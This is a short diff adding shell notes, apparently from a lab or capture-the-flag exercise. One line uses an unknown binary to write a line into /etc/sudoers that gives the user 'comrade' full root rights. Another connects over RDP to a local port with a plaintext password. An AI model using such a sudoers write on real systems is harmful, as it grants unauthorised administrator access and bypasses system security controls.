@@ -1,0 +1,3 @@
+ ./unknown /etc/sudoers "comrade ALL=(ALL:ALL) ALL"
+
+xfreerdp /v:127.0.0.1:4646 /u:comrade /p:StudentMidwayPassword /size:1920x1024 +clipboard
